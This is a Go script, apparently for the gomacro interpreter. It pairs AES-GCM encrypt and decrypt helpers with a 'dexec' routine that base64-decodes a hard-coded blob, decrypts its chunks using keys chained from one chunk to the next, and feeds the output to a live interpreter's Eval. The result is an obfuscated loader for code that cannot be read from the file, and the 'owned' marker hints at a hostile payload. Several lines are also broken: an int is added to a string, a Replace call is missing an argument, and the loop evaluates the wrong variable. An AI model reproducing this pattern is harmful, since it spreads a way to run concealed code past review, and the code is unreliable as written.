package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"

	cr "crypto/rand"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"strings"

	"github.com/cosmos72/gomacro/fast"
)

func logandForget(e error) {
	fmt.Println("error:\t", e)
}
func fromb64(v string) []byte {
	tmp, err1 := base64.RawURLEncoding.Strict().DecodeString(v)
	logandForget(err1)
	return tmp
}
func finalSplit(d []byte, sep string) [][]byte {
	return bytes.Split(d, []byte(sep))
}

// func fromb64(v string) []byte {
// 	tmp, err2 := base64.RawURLEncoding.Strict().DecodeString(v)
// 	logandForget(err2)
// 	return tmp
// }
func NewEncryptionKey() []byte {
	key := [32]byte{}
	_, err3 := io.ReadFull(cr.Reader, key[:])
	if err3 != nil {
		panic(err3)
	}
	return key[:]
}

// Encrypt encrypts data using 256-bit AES-GCM.  This both hides the content of
// the data and provides a check that it hasn't been altered. Output takes the
// form nonce|ciphertext|tag where '|' indicates concatenation.
func Encrypt(plaintext []byte, key []byte) (ciphertext []byte, err9 error) {
	block, err4 := aes.NewCipher([]byte(key))
	if err4 != nil {
		return nil, err4
	}

	gcm, err5 := cipher.NewGCM(block)
	if err5 != nil {
		return nil, err5
	}

	nonce := make([]byte, gcm.NonceSize())
	_, err6 := io.ReadFull(cr.Reader, nonce)
	if err6 != nil {
		return nil, err6
	}

	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

// Decrypt decrypts data using 256-bit AES-GCM.  This both hides the content of
// the data and provides a check that it hasn't been altered. Expects input
// form nonce|ciphertext|tag where '|' indicates concatenation.
func Decrypt(ciphertext []byte, key []byte) (plaintext []byte, err8 error) {
	block, err7 := aes.NewCipher([]byte(key))
	if err7 != nil {
		return nil, err7
	}

	gcm, err8 := cipher.NewGCM(block)
	if err8 != nil {
		return nil, err8
	}

	if len(ciphertext) < gcm.NonceSize() {
		return nil, errors.New("malformed ciphertext")
	}

	return gcm.Open(nil,
		ciphertext[:gcm.NonceSize()],
		ciphertext[gcm.NonceSize():],
		nil,
	)
}
func tob64(v []byte) string {
	return base64.RawURLEncoding.EncodeToString(v)
}
func enc(text, newkey, key []byte, sep string) []byte {
	text = append(text, []byte(sep)...)
	e, err := Encrypt(append(text, []byte(tob64(newkey))...), key)
	if err != nil {
		fmt.Println(err)
	}
	return e
}

// func fromb64(v string) []byte {
// 	tmp, err2 := base64.RawURLEncoding.Strict().DecodeString(v)
// 	logandForget(err2)
// 	return tmp
// }
func dec(text []byte, key []byte) ([]byte, []byte) {
	d, err := Decrypt(text, key)
	if err != nil {
		if len(d) == 0 {
			return []byte("finish(); // owned\n"), NewEncryptionKey()
		} else {
			// fmt.Println(err)
		}
	}
	return d, []byte(strings.Split(strings.Replace(string(d),"\"","`"), " // ")[1])
}
func finalJoin(enc [][]byte, key []byte, sep string) []byte {
	// fmt.Println("x0r4")
	enc = append(enc, key)
	// fmt.Println(string(bytes.Join(enc, []byte(sep))))
	return bytes.Join(enc, []byte(sep))
}

// key := NewEncryptionKey()
sepFinal := "#@!!@#"
dexec := func(code string) {
	interp := fast.New()
	// interp.Eval()
	// bufio.NewReader
	fmt.Println(code)
	fmt.Println(fromb64(code))
	fmt.Println("DEXEC")
	encoded := finalSplit(fromb64(code), sepFinal)
	k := encoded[len(encoded)-1]
	buf := ""
	for i := range encoded {
		d, nk := dec(encoded[i], k)
		buf += i+"\n"
		vals, err := interp.Eval(fmt.Sprintf("%v", buf))
		fmt.Println(vals)
		k = fromb64(string(nk))
	}
}
dexec(`TDqX3mgteLAPae6rpZTZVlZwRQXf2NqnrnYb3E48qGxZivPXpOMhfpC3FMM4uTk4sGrtBsJeWTkgZMSB27E9TZ1Dq3KffNpHMN8JKbuuLnK107VzSSVLmsc5tCmOMi9z03WvMBWr3D4iAlojQCEhQCOz0UyL6-7GAbHWhAIp3lGnT5TKwW6WcTxYoXeAb5AyCg`)